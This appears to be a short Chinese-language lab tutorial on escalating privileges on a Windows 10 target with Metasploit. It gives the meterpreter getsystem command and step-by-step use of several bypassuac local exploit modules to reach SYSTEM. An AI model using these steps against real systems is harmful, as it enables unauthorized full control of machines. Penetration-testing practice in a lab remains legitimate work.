# 一、环境准备

1 MSF-Metasploit Framework

2 一台windiows靶机

# 二、实战

1 提权方法（Windows）查看当前获得用户的权限   meterpreter 中输入： getuid

![[1644493116225.png]]

方法一、 meterpreter中输入：getsystem

![[1644493125642.png]]

方法二、使用msf模块提权

要想提权必须是已经拿到meterpreter  然后将当前meterpreter 后台 meterprerer中输入  background

1、 查看可用模块  MSF终端中输入   search bypassuac   查看提权模块

2、 选择一个适合当前系统的提权模块  我这边使用的是win10系统

那我们使用：use  exploit/windows/local/bypassuac_windows_store_reg  尝试提权

这个模块不行就换一个 use exploit/windows/local/bypassuac_sluihijack

或者  use exploit/windows/local/bypassuac_dotnet_profiler


3 配置模块使用参数   终端内输入： show options

4 可以看到需要配置 session  终端内输入：set session  {需要提权的session id}

5 执行提权  终端内输入：run

6 获取到meterpreter后 我们在终端内 输入getuid 看实际还没有提权成功  需要在还终端内在输入 getsystem 获取权限 

7 获取权限完成后 输入getuid 即可看到  已经获取到SYSTEM 最高权限了

![[1644493163472.png]]

看到这个证明已经将权限提升成功

